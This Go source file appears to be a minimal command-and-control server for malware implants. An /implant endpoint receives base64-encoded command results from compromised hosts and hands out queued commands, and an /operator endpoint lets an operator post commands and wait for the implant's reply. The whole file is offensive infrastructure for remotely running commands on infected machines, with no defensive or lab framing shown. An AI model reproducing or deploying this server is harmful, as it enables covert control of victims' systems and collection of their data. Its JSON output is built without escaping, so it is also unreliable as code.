package main
import (
    "fmt"
	"log"
	"net/http"
	"net"
    "encoding/base64"
    "strings"
)

var err error
var serverIP string
var ip string
var cmdGroup string 
var cmdString string
var commandQueue [][]string 

type Command struct {
    Group    string
    Command  string
    Response string
}

var responseChan = make(chan Command)

func main() {
    // Get the server's IP address

    // Start the server in a goroutine
    go startServer()

    select {}
}

func startServer() {
    http.HandleFunc("/implant", handleImplant)
    http.HandleFunc("/operator", handleOperator)
    serverIP, err := getServerIP()
    if err != nil {
        log.Fatal("Error:", err)
    }
    // Get the server's IP address
    if serverIP == "" {
        log.Fatal("Failed to determine server IP address")
    }
    fmt.Printf("Server started at http://%s:8443\n", serverIP)
	// Server configuration
	server := http.Server{
		Addr:      ":8443",
	}

	// Serve
    err = server.ListenAndServe()
    defer server.Close()
}

func getServerIP() (string, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "", fmt.Errorf("failed to retrieve interface addresses: %v", err)
    }

    for _, addr := range addrs {
        ipnet, ok := addr.(*net.IPNet)
        if !ok {
            continue
        }
        if ipnet.IP.IsGlobalUnicast() && ipnet.IP.To4() != nil {
			serverIP = ipnet.IP.String()
            return ipnet.IP.String(), nil
        }
    }
    return "", fmt.Errorf("unable to determine server IP address")
}

func handleImplant(w http.ResponseWriter, r *http.Request) {
    // Parse the URL query parameters
    queryParams := r.URL.Query()

    // Retrieve the value of 'aa' parameter
    aaParam := queryParams.Get("aa")
    // Check if 'aa' parameter is present
    if aaParam != "" {
        // Decode the base64-encoded value
        decodedBytes, err := base64.StdEncoding.DecodeString(aaParam)
        if err != nil {
            http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
            return
        }

        decodedString := string(decodedBytes)
        params := strings.Split(decodedString, "&")
        paramMap := make(map[string]string)

        for _, param := range params {
            keyValue := strings.Split(param, "=")
            if len(keyValue) == 2 {
                key := keyValue[0]
                value := strings.TrimSpace(keyValue[1])
                value = strings.Replace(value, "\r", "\\r", -1) // Replace any carriage returns (\r) with an empty string
                value = strings.Replace(value, "\\", "\\\\", -1) // Escape any backslashes in the value
                value = strings.Replace(value, "\n", "\\n", -1) // Remove newlines
                paramMap[key] = value
            }
        }

        responseChan <- Command{
            Group:    paramMap["cmdValue"],
            Command:  paramMap["cmdString"],
            Response: paramMap["cmdResponse"],
        }

    } else {
        http.Error(w, "No parameter found in the request", http.StatusBadRequest)
    }

    if len(commandQueue) != 0 {
        cmdPair := commandQueue[0]
        cmdGroup = cmdPair[0]
        cmdString = cmdPair[1]

        // Define the response body as a string
        responseBody := "cmdGroup:" + cmdGroup + "\n" +
        "cmdString:" + cmdString

        // Set Content-Type header
        w.Header().Set("Content-Type:", "text/plain")

        // Set Content-Length header
        w.Header().Set("Content-Length:", fmt.Sprint(len(responseBody)))

        // Write the response body
        fmt.Fprintf(w, responseBody)
        // Remove the processed command pair from the queue
        commandQueue = commandQueue[1:]
    }
}

func handleOperator(w http.ResponseWriter, r *http.Request) {
    fmt.Println("Received request from operator")
    // Only allow POST requests
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // Parse form data
    err := r.ParseForm()
    if err != nil {
        http.Error(w, "Failed to parse form", http.StatusBadRequest)
        return
    }

    // Get cmdGroup and cmdString from form data
    cmdGroup := r.Form.Get("cmdGroup")
    cmdString := r.Form.Get("cmdString")

    // Store the command in the global commands array
    commandQueue = append(commandQueue, []string{cmdGroup, cmdString})

    // Wait for the response from the implant
    response := <-responseChan

    responseJSON := fmt.Sprintf(`{"cmdGroup": "%s", "cmdString": "%s", "cmdResponse": "%s"}`, response.Group, response.Command, response.Response)
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusOK)
    _, _ = w.Write([]byte(responseJSON))
}